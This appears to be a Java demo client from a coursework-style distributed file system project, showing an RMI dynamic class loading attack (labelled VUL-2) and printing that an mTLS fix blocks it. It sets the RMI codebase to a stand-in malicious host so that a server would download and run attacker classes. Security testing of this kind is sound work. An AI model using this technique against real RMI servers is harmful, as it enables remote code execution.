package dfs.attacker;

import dfs.server.FileServerI;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * ATTACKER CLIENT 2 — VUL-2: Dynamic Class Loading
 * Attempts to exploit RMI dynamic class loading
 * by setting a malicious remote codebase.
 */
public class DynamicClassLoadingAttacker {

    public static void main(String[] args) {
        System.out.println("=== ATTACKER 2: Dynamic Class Loading Attack (VUL-2) ===");
        try {
            // VULNERABILITY: VUL-2 - If useCodebaseOnly=false, server loads from here
            System.setProperty("java.rmi.server.codebase", "http://malicious-server.com/evil/");

            Registry reg = LocateRegistry.getRegistry("localhost", 1000);
            FileServerI stub = (FileServerI) reg.lookup(FileServerI.serviceName + 1000);

            System.out.println("[ATTACKER] Connected to RMI registry.");
            System.out.println("[ATTACKER] Malicious codebase set to: http://malicious-server.com/evil/");
            System.out.println("[ATTACKER] If server has useCodebaseOnly=false,");
            System.out.println("[ATTACKER] it would load EvilClass from our server!");
            System.out.println("[ATTACKER] RCI (Remote Codebase Injection) attempted.");

        } catch (Exception e) {
    System.out.println("[SECURED]  Connection blocked: " + e.getMessage());
    System.out.println("========================================");
    System.out.println(" PROOF: mTLS blocking unauthorized      ");
    System.out.println(" clients — VUL-3 Fix WORKING!           ");
    System.out.println("========================================");
}
    }
}
